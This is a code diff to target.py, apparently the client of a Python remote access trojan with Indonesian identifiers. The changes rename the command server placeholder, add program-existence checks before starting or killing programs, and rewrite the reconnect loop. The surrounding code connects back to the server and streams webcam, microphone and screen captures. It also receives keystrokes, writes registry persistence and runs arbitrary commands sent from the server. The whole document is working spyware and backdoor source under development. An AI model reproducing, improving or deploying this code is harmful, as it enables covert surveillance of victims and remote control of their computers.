Detect if program is exists

+++ target.py
@@ -44,7 +44,7 @@ def send_camera_image(server_ip, port=9999):
 keyb = Controller()
 def acc_keystroke():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect(('[ipserver]', 9995))
+        s.connect(('[ip_server]', 9995))
         while True:
             data = s.recv(1024)
             if not data:
@@ -78,7 +78,7 @@ def record_n_send():
     frame = []
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect(('[ipserver]', 9996))
+            s.connect(('[ip_server]', 9996))
             for _ in range(0, int(RATE / CHUNK * 20)):
                 data = stream.read(CHUNK)
                 s.sendall(data)
@@ -101,8 +101,7 @@ def  execute_persistence(nama_registry, file_exe):
             pass
     except:
         pass
-
-
+    
 def send_screen_record(server_ip, port=9991):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((server_ip, port))
@@ -132,7 +131,7 @@ def send_screen_record(server_ip, port=9991):
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        sock.connect(('[ipserver]', 9998))
+        sock.connect(('[ip_server]', 9998))
         vid = cv2.VideoCapture(0)
         while vid.isOpened:
             img, frame = vid.read()
@@ -236,7 +235,7 @@ def jalankan_perintah():
             upload_file('ss.png')
             os.remove("ss.png")
         elif perintah == 'screen_share':
-            send_screen_record(server_ip='[ipserver]', port=9991)
+            send_screen_record(server_ip='[ip_server]', port=9991)
         elif perintah[:11] == 'persistence':
             nama_registry, file_exe = perintah[12:].split(' ')
             execute_persistence(nama_registry, file_exe)
@@ -247,16 +246,16 @@ def jalankan_perintah():
         elif perintah == 'send_key':
             acc_keystroke()
         elif perintah == 'snap_cam':
-            send_camera_image(server_ip='[ipserver]', port=9993)
+            send_camera_image(server_ip='[ip_server]', port=9993)
         elif perintah[:7] == 'execute':
-            try:
+            if shutil.which(perintah[8:]):
                 os.system(f"start {perintah[8:]}")
-            except:
+            else:
                 pass
         elif perintah[:4] == 'kill':
-            try:
+            if shutil.which(perintah[5:]):
                 os.system(f"taskkill /IM {perintah[5:]} /F")
-            except:
+            else:
                 pass
         else:
             exe = subprocess.Popen(
@@ -274,12 +273,13 @@ def jalankan_perintah():
 def execute_persist():
     while True:
         try:
-            time.sleep(10)
-            sok.connect(('[ipserver]', 9999))
+            sok.connect(('[ip_server]', 9999))
             jalankan_perintah()
             sok.close()
             break
         except:
-            execute_persist()
+            try: sok.close()
+            except: pass
+        time.sleep(1)
 
 execute_persist()
